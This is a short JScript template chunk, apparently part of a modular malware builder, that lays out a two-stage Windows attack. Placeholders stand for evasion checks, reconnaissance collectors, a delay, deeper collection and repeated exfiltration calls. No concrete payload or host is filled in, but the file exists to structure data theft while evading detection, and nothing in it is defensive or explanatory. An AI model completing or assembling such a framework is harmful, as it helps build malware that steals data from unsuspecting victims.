// chunk: arch/staged
// depends: core/emit_buffer, core/run_cmd, core/file_ops
// provides: main
// format: jscript

{{EVASION_CHECKS}}

emit("=== STAGE 1: RECON ===\r\n");
{{STAGE1_COLLECTORS}}

{{EXFIL_CALL}}

WScript.Sleep({{STAGE2_DELAY}});

emit("=== STAGE 2: DEEP ===\r\n");
{{STAGE2_COLLECTORS}}

{{EXFIL_CALL}}
